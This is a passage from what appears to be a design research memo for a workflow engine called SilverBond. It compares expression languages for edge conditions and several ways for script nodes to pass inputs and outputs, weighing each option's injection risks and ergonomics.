3. **Gate the override surface per field/per node — this is a CVE class, not hygiene.** LangChain makes authors declare `configurable_fields` and warns against `'any'`; Flowise ships `overrideConfig` **disabled by default** with a per-field allow-list and still earned [CVE-2026-69258](https://advisories.gitlab.com/npm/flowise/CVE-2026-69258) for ungated property injection ([Flowise docs](https://docs.flowiseai.com/using-flowise/prediction)).
4. **Per-node targeting needs a node-identity key, and merge semantics must be stated.** Flowise keys overrides by nodeId (`llmAgentflow_0` vs `_1`) precisely because graphs contain many same-type nodes; it also has a footgun where array-valued overrides **concatenate** instead of replacing ([#5204](https://github.com/FlowiseAI/Flowise/issues/5204)).
5. **Profile resolution needs a floor, not just a chain.** OpenRouter's auto-router falls back to a default model set if its own ranking service is down, so a request never fails because routing hiccuped ([blog](https://openrouter.ai/blog/insights/model-routing/)). An unknown/typo'd profile name needs a chosen behaviour — fail loudly, or default — not an accident.
6. **Record the resolved model in the execution record.** Langfuse ties model config to a versioned prompt so the pairing is reconstructable after the fact ([config docs](https://langfuse.com/docs/prompt-management/features/config)). Without this, "why did this run behave differently" is unanswerable.

---

## Shortlist of concrete design variants

### (a) Expression language for edge conditions

**A1 — Keep structured `{field, operator, value}`, add explicit types + a `missing` policy.** Extend operators to typed families (`eq_string`, `eq_number`, `matches`, `exists`, `is_empty`) and add a per-edge `on_missing: false | error | route` policy. *Pros:* zero new dependency; no injection surface (values are never source text); trivially diffable/round-trippable in the `version: 4` schema; UI stays a form, so no editor/preview divergence (§1 lesson 6); typed operators kill the `"false"`-truthy class outright (§1 lesson 3). *Cons:* no compound boolean logic (`A && (B || C)`) without adding a group/tree node; no arithmetic or string functions; power users will ask for an escape hatch.

**A2 — Structured conditions as a JSONLogic AST (`jsonlogic-rs`).** Replace the flat triple with a nested JSON AST; the current triple becomes the degenerate one-node case. *Pros:* strict superset of A1, so **migration is mechanical**; compound logic and nesting for free; JSON-as-AST means it stores, diffs, and validates in the existing schema with no new parser; "we never `eval()`... read access only" ([jsonlogic.com](https://jsonlogic.com/)); missing keys are falsy, not errors; a Rust crate claiming 100% standard-op coverage exists. *Cons:* `jsonlogic-rs` is a modest-traction crate with low bus factor; JSONLogic is verbose to hand-author (needs a builder UI, which SilverBond has anyway); spec is small and effectively frozen — no path to string functions beyond the standard ops; still untyped, so type discipline must come from the UI.

**A3 — CEL via the `cel` crate, as an *optional* advanced mode alongside A1/A2.** *Pros:* real language (macros, comparisons, string ops); large mindshare from Kubernetes/Envoy so users may already know it; actively maintained with ~667k recent downloads and a 2026 conference talk; non-Turing-complete by design. *Cons:* **missing key is a hard error** — the single biggest semantic mismatch with LLM output, forcing `has()`/`?.` discipline on every rule (§1); no Rust type-checker, and no schema to check against; ~21% documented, no published conformance figure; a known full-clone-per-accessor cost on large contexts (#303) that lands exactly on `parsedOutput`; and adding it means SilverBond now has *two* condition dialects — the precise mistake Argo is still apologising for ([#5142](https://github.com/argoproj/argo-workflows/issues/5142), [#7576](https://github.com/argoproj/argo-workflows/issues/7576)).

**A4 — `expr-lang` (jdx/expr.rs) instead of CEL.** *Pros:* nil-safe by design (`?.`, `??`) which fits missing LLM keys far better than CEL; simpler surface; it is the language Argo moved *toward*, not away from. *Cons:* young (first release Nov 2024, ~2.7k LOC, ~57k recent downloads) with a single maintainer; API still moving (0.1 → 1.1 fast); no spec/conformance ecosystem behind the Rust port.

*Non-starters:* `jmespath.rs` (unmaintained), `evalexpr` (bespoke semantics, no spec), full jq via `jaq` (a functional programming language is far past what an edge condition needs).

### (b) Script-node IO

**B1 — Env-var inputs + dedicated output file (the GHA/Argo convergence).** Engine exports `SB_VAR_<NAME>` and `SB_NODE_<ID>_<PATH>` into the pane's environment, plus `SB_OUTPUT=/run/sb/<exec>/<node>.out`; the script writes `key=value` or JSON there; the engine reads the file after exit and uses exit code for success. *Pros:* eliminates the entire script-injection class (§2 lessons 1–2); no stdout scraping, so tmux scrollback stays purely human-readable (§2 lesson 3); independently converged on by both GHA (`$GITHUB_OUTPUT`) and Argo (`valueFrom.path`); trivially size-cappable at read time; exit code stays orthogonal to output. *Cons:* env vars have a size limit (~128KB per var on Linux, `ARG_MAX` for the whole block), so large `parsedOutput` values need a file fallback; requires a writable path per node execution and cleanup; the script must be *told* to write to the file — a plain `echo` no longer "just works", which is a real ergonomics regression for casual one-liner steps.

**B2 — Env-var inputs + `stdout` captured wholesale as an opaque string (Argo's `outputs.result`).** No parsing, no sentinels — the whole stdout becomes the node's raw output; `parsedOutput` is produced by an explicit, separately-configured parse step (JSON / regex / none). *Pros:* zero delimiter-injection surface because nothing in stdout is *control* data (§2 lesson 4); matches how a tmux pane naturally behaves; casual `echo` steps work with no ceremony; parse failure is a visible, debuggable node state rather than silent mis-scraping. *Cons:* cannot return multiple named outputs from one script; mixes logs and payload, so any step that prints progress corrupts its own output unless the author is disciplined; large outputs must be capped or they flood the store.

**B3 — Hybrid: B2 by default, B1 available.** stdout-as-opaque-string is the default (ergonomic, injection-free); a node opts into `SB_OUTPUT` file capture when it needs named/structured outputs. *Pros:* keeps the one-liner path frictionless while giving the structured path a safe channel; matches GH Actions' actual end state (logs on stdout, structure in a file); lets `parsedOutput` come from either source through one parse stage. *Cons:* two output paths to document, test, and explain; the inspector must show which mode a node is in or users will misattribute empty output.

**B4 — Sentinel-delimited block in stdout (`<<<SB_OUTPUT:{nonce}>>> ... <<<END:{nonce}>>>`).** *Pros:* single channel, works over any transport including a raw pane capture with no filesystem dependency; no env-var size ceiling. *Cons:* **this is the design GitHub abandoned.** Even with a per-execution random nonce (mandatory — a fixed `EOF` is injectable, [jstrieb](https://jstrieb.github.io/posts/github-actions-multiline-outputs/)), an LLM CLI that echoes its own prompt or transcript can reproduce the nonce; it re-couples logs and control data on the one channel §2 lesson 3 says to separate. Only justifiable if a filesystem channel is genuinely unavailable.

**Cross-cutting for any variant:** treat `parsedOutput` as untrusted (§2 lesson 2); cap output size at capture with a loud error (§2 lesson 8); keep exit code as the sole success signal (§2 lesson 7); and document that a tmux pane is an execution, not a security, boundary (§2 lesson 6).
